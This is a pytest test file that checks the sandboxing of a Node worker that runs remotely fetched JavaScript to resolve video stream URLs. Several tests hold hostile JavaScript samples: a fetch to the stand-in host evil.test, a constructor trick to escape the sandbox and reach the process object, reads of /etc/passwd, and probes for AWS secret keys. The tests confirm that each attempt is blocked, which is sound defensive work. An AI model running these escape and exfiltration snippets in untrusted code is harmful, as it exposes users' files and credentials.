import shutil
import threading
from types import SimpleNamespace

import pytest

from media_cli.extractors import senshi_runtime as runtime
from media_cli.extractors.senshi_runtime import SenshiRuntimeError, resolve_vidcloud


def test_runtime_and_media_share_the_exact_user_agent():
    from media_cli.providers.senshi import HEADERS
    assert HEADERS["User-Agent"] == runtime.USER_AGENT


@pytest.mark.skipif(not shutil.which("node"), reason="Node required for isolated worker check")
def test_permissioned_runtime_resolves_without_browser_or_network(monkeypatch):
    code = 'window.__oct={open:async id=>[{source:[{src:"https://s-90.bcdn1.se/master.txt",label:"both"}],tracks:[]}]};'
    monkeypatch.setattr(runtime, "_fetch_runtime", lambda *a: code)
    result = resolve_vidcloud(3731)
    assert result[0]["source"][0]["label"] == "both"


@pytest.mark.parametrize("bad_id", ["../1", "1&other=2", -1, 0, True])
def test_runtime_rejects_invalid_episode_ids_without_fetching(bad_id):
    with pytest.raises(SenshiRuntimeError):
        resolve_vidcloud(bad_id)


def test_runtime_honors_pre_cancel():
    cancel = threading.Event()
    cancel.set()
    with pytest.raises(SenshiRuntimeError):
        resolve_vidcloud(3731, cancel=cancel)


def test_runtime_cannot_send_requests_to_an_unrelated_host(monkeypatch):
    code = 'window.__oct={open:async()=>{await fetch("https://evil.test/private");return []}};'
    monkeypatch.setattr(runtime, "_fetch_runtime", lambda *a: code)
    with pytest.raises(SenshiRuntimeError, match="not permitted"):
        resolve_vidcloud(3731)


def test_runtime_worker_has_no_direct_network_or_user_environment(monkeypatch):
    code = '''window.__oct={open:async()=>{
      const process = console.log.constructor("return process")();
      if (process.env.HOME || process.env.AWS_SECRET_ACCESS_KEY) throw new Error("environment leaked");
      await process.getBuiltinModule("fs").promises.readFile("/etc/passwd");
      return [];
    }};'''
    monkeypatch.setattr(runtime, "_fetch_runtime", lambda *a: code)
    with pytest.raises(SenshiRuntimeError):
        resolve_vidcloud(3731)


def test_worker_environment_and_native_permission_boundary(monkeypatch, tmp_path):
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "synthetic-not-for-worker")
    # Exercise native worker permissions directly, without relying on node:vm.
    worker = tmp_path / "worker.cjs"
    worker.write_text('''require("node:readline").createInterface({input:process.stdin}).once("line",async()=>{
      const p=process;
      const out={env:Object.keys(p.env)};
      try {p.getBuiltinModule("fs").readFileSync("/etc/passwd");out.read=true;}
      catch(e) {out.read=false;out.readCode=e.code;}
      await new Promise(resolve=>{
        try {
          const socket=p.getBuiltinModule("net").connect(443,"1.1.1.1");
          socket.once("connect",()=>{out.network=true;socket.destroy();resolve();});
          socket.once("error",e=>{out.network=false;out.networkCode=e.code;resolve();});
        } catch(e) {out.network=false;out.networkCode=e.code;resolve();}
      });
      try {new ArrayBuffer(2*1024*1024*1024);out.largeAllocation=true;}
      catch(e) {out.largeAllocation=false;}
      console.log(JSON.stringify({kind:"result",result:[out]}));
    });''')
    monkeypatch.setattr(runtime, "__file__", str(tmp_path / "worker.py"))
    monkeypatch.setattr(runtime, "_fetch_runtime", lambda *a: "unused")
    result = resolve_vidcloud(3731)[0]
    assert set(result["env"]) <= {"LANG", "PWD"}
    assert result["read"] is False and result["readCode"] == "ERR_ACCESS_DENIED"
    assert result["largeAllocation"] is False
    assert result["network"] is False and result["networkCode"] in {"ERR_ACCESS_DENIED", "ENETUNREACH", "EACCES", "EPERM"}


def test_waiting_runtime_obeys_deadline_and_kills_worker(monkeypatch):
    processes = []
    popen = runtime.subprocess.Popen
    def create(*a, **kw):
        process = popen(*a, **kw)
        processes.append(process)
        return process
    monkeypatch.setattr(runtime.subprocess, "Popen", create)
    monkeypatch.setattr(runtime, "_fetch_runtime", lambda *a:
                        'window.__oct={open:()=>new Promise(()=>{})};')
    with pytest.raises(SenshiRuntimeError, match="timed out"):
        resolve_vidcloud(3731, timeout=.25)
    assert processes and all(process.poll() is not None for process in processes)


def test_cancel_waiting_runtime_does_not_retry(monkeypatch):
    cancel = threading.Event()
    started = threading.Event()
    def code(*a):
        started.set()
        return 'window.__oct={open:()=>new Promise(()=>{})};'
    monkeypatch.setattr(runtime, "_fetch_runtime", code)
    def stop():
        started.wait(1)
        cancel.set()
    thread = threading.Thread(target=stop)
    thread.start()
    try:
        with pytest.raises(SenshiRuntimeError, match="cancelled"):
            resolve_vidcloud(3731, cancel=cancel)
    finally:
        thread.join(2)


def test_transport_failure_uses_one_fresh_attempt(monkeypatch):
    import curl_cffi.requests
    attempts = []
    class Session:
        def __init__(self, **kwargs):
            pass
        def __enter__(self):
            return self
        def __exit__(self, *a):
            pass
        def request(self, *a, **kwargs):
            attempts.append(self)
            if len(attempts) == 1:
                raise OSError("synthetic-sensitive-transport-error")
            kwargs["content_callback"](b"synthetic-runtime")
            return SimpleNamespace(status_code=200)
    monkeypatch.setattr(curl_cffi.requests, "Session", Session)
    monkeypatch.setattr(runtime, "_run", lambda *a: [{"source": "https://s-90.bcdn1.se/master.txt"}])
    assert resolve_vidcloud(3731)
    assert len(attempts) == 2 and attempts[0] is not attempts[1]
